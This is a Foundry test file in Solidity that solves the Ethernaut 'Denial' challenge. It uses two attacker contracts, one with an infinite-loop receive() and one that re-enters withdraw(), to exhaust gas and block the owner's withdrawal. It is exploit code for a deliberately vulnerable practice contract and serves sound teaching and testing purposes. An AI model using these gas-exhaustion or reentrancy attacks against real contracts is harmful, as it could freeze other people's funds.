// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/openzeppelin-ethernaut/Denial.sol";

contract MiddleMan {
    receive() external payable {
        while (true) {}
    }
}

// this involves repeatedly touching storage, making the two storage writes become warm from previous rounds
contract MiddleMan2 {
    receive() external payable {
        Denial(payable(msg.sender)).withdraw();
    }
}

// exhaust gas during partner.call()
// according to 63/64 gas rule, external calls have at most 63/64 of the remaining gas
// 1_000_000 / 64 = 15,625
// thus, tx will run out of gas with 1 cold storage writing ~22,100; warm storage write ~2,900
// 63/64 rule source: https://www.cyfrin.io/glossary/63-64-gas-rule-solidity-code-example
contract DenialTest is Test {
    // Denial instance = Denial(payable(vm.envAddress("DENIAL")));
    Denial instance;
    uint256 gasLimit = 1_000_000;

    function setUp() public {
        instance = new Denial();
        address(instance).call{value: 1 ether}("");
    }

    function test1() public {
        MiddleMan middleMan = new MiddleMan();
        instance.setWithdrawPartner(address(middleMan));

        vm.expectRevert();
        instance.withdraw{gas: gasLimit}();

        vm.expectCall(address(middleMan), "");
        instance.withdraw{gas: 6_000_000}();
    }

    function test2() public {
        MiddleMan2 middleMan = new MiddleMan2();
        instance.setWithdrawPartner(address(middleMan));

        vm.expectRevert();
        instance.withdraw{gas: gasLimit}();

        vm.expectCall(address(middleMan), "");
        instance.withdraw{gas: 3_000_000}();
    }
}
